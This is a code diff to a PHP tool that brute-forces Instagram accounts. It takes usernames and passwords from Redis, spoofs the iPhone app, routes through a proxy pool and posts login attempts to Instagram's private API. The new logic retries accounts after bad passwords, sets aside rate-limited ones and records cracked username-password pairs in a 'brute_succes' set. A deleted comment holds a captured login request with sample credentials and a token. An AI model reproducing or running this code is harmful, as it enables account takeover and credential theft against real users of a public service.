@@ -37,23 +37,23 @@ public function run() {
       $IGDataPath = null;
       $this->UA = 'Instagram 9.6.0 (iPhone8,1; iPhone OS 9_3_1; en_US; en-US; scale=2.00; 750x1334) AppleWebKit/420+';
       
-      $this->uuid = $this->generateUUID(true);
-      $this->waterfall_id =  $this->generateUUID(true);
+      // $this->uuid = $this->generateUUID(true);
+      // $this->waterfall_id =  $this->generateUUID(true);
 
-      ////
-      $this->advertiser_id = $this->generateUUID(true);
-      $this->anon_id = $this->generateUUID(true);
-      $this->session_id = $this->generateUUID(true);
+      // ////
+      // $this->advertiser_id = $this->generateUUID(true);
+      // $this->anon_id = $this->generateUUID(true);
+      // $this->session_id = $this->generateUUID(true);
       ////
 
       // this data from redis
-      $proxy_string = $this->redis->spop('proxy');
+      // $proxy_string = $this->redis->spop('proxy');
       // $exploded_proxy = explode(":", $proxy_string);
 
       $this->proxy = null;//$exploded_proxy[0].":".$exploded_proxy[1];  
       $this->proxy_auth_credentials = null; //$exploded_proxy[2].":".$exploded_proxy[3];  
-      echo  $exploded_proxy[0].":".$exploded_proxy[1];  
-      echo  $exploded_proxy[2].":".$exploded_proxy[3];  
+      // echo  $exploded_proxy[0].":".$exploded_proxy[1];  
+      // echo  $exploded_proxy[2].":".$exploded_proxy[3];  
 
 
       // credentials for brute
@@ -63,25 +63,28 @@ public function run() {
       //   $this->redis->lpush("passwords", $pass);
       // }
 
+
+     $passwords = $this->redis->lrange("passwords", 0 , -1); //"qweqwe";
     
-    while ($this->redis->scard("usernames_retry") > 0 || $this->redis->scard("usernames_clean") > 0 ) {
+    // while ($this->redis->scard("usernames_retry") > 0 || $this->redis->scard("usernames_clean") > 0 ) {
 
       if ($this->redis->scard("usernames_retry") == 0 ) {
         $this->username = $this->redis->spop("usernames_clean"); 
-        $passwords = $this->redis->lrange("passwords", 0 , -1); //"qweqwe";
-        foreach ($passwords as $pwd) {
-          $this->redis->sadd( $this->username , $pwd);
-        } 
-        $this->password = $this->redis->spop($this->username);
+       
+
+        // foreach ($passwords as $pwd) {
+        //   $this->redis->sadd( $this->username , $pwd);
+        // } 
+        $this->password =  $passwords[mt_rand(0, count($passwords) - 1)];
  
       } else {
         $this->username = $this->redis->spop("usernames_retry");  
-        $this->password = $this->redis->spop($this->username);
+        $this->password =  $passwords[mt_rand(0, count($passwords) - 1)];
       }
     
       $this->cookies_enabled = false;
       $this->login();
-    }
+    // }
 
       // // $this->on_create_new();
       // $this->username = "4ewir";
@@ -228,28 +231,7 @@ public function on_create_new() {
 
 
 public function login() {
-
-
-// POST https://i.instagram.com/api/v1/accounts/login/ HTTP/1.1
-// Host: i.instagram.com
-// Accept: *
-// Proxy-Connection: keep-alive
-// X-IG-Connection-Type: WiFi
-// Accept-Encoding: gzip, deflate
-// Accept-Language: ru-RU;q=1
-// Content-Type: application/x-www-form-urlencoded; charset=UTF-8
-// Content-Length: 325
-// User-Agent: Instagram 10.0.1 (iPhone6,1; iPhone OS 9_3_5; ru_RU; ru-RU; scale=2.00; 640x1136) AppleWebKit/420+
-// Connection: keep-alive
-// X-IG-Capabilities: 3wo=
-// Cookie: csrftoken=9PJ3IGSCUSlGGVfS379alJ1dMqkkKSbQ; mid=Vt9VQAAAAAFs7QCccW9eS1SurGzG
-
-// signed_body=b8c8f28d6f2cac732f5e241ef1877afb14d7186e098365cd0a3fafdc42447c03.
-  // {"username":"4ewir",
-  // "password":"qweqwe",
-  // "_csrftoken":"9PJ3IGSCUSlGGVfS379alJ1dMqkkKSbQ",
-  // "device_id":"F30F7D45-024B-478A-A1FC-75EC32B2F629",
-  // "login_attempt_count":"1"}&ig_sig_key_version=5
+ 
 
        $this->uuid = $this->generateUUID(true);
        $this->device_id = $this->generateUUID(true);
@@ -257,11 +239,11 @@ public function login() {
 
       $fetch = $this->request('https://i.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid='.str_replace('-', '', $this->uuid), null, true);
         
-      preg_match('#Set-Cookie: csrftoken=([^;]+)#', $fetch[0], $token);
+      preg_match('/Set-Cookie: csrftoken=([^;]+)/', $fetch[0], $token);
 
       $data = [
    //   'phone_id'            => $this->phone_id,  
-      '_csrftoken'          => $token[0],
+      '_csrftoken'          => "",//$token[0],
       'username'            => $this->username,
       //'guid'                => $this->uuid,
       'device_id'           => $this->device_id,
@@ -271,21 +253,24 @@ public function login() {
 
       $login = $this->request('https://i.instagram.com/api/v1/accounts/login/', $this->generateSignature(json_encode($data)), true);
 
-      // if ($login[1]['status'] == 'fail') {
-      //     if ($this->redis->scard($this->username) > 0 ) {
-      //      $this->redis->sadd("usernames_retry", $this->username);
-      //     } else {
-      //        $this->redis->sadd("usernames_black", $this->username);
-      //     }
-      //     echo "[scanner] fail to login";
-      //     //return;
-      // } else {
-      //     $this->redis->sadd("brute_succes", $this->username."|".$this->password);
-      //     $this->redis->del($this->username);
-      //     echo "[scanner] success";
-      // }
+      if ($login[1]['status'] == 'fail' && isset ( $login[1]['error_type'] ) &&   $login[1]['error_type'] == "bad_password" ) {
+          if ($this->redis->scard($this->username) > 0 ) {
+           $this->redis->sadd("usernames_retry", $this->username);
+          } else {
+             $this->redis->sadd("usernames_black", $this->username);
+          }
+          echo "[scanner] fail to login\n";
+          //return;
+      } elseif ( $login[1]['status'] == 'fail' && isset($login[1]['error_type']) &&  $login[1]['error_type'] == "rate_limit_error" ) {
+           $this->redis->sadd("usernames_holdon", $this->username);
+      }
+      elseif  ( $login[1]['status'] != 'fail' ) {
+          $this->redis->sadd("brute_succes", $this->username."|".$this->password);
+          // $this->redis->del($this->username);
+          echo "[scanner] success";
+      }
 
-       $this->funcrecur();
+       // $this->funcrecur();
 
 }
 
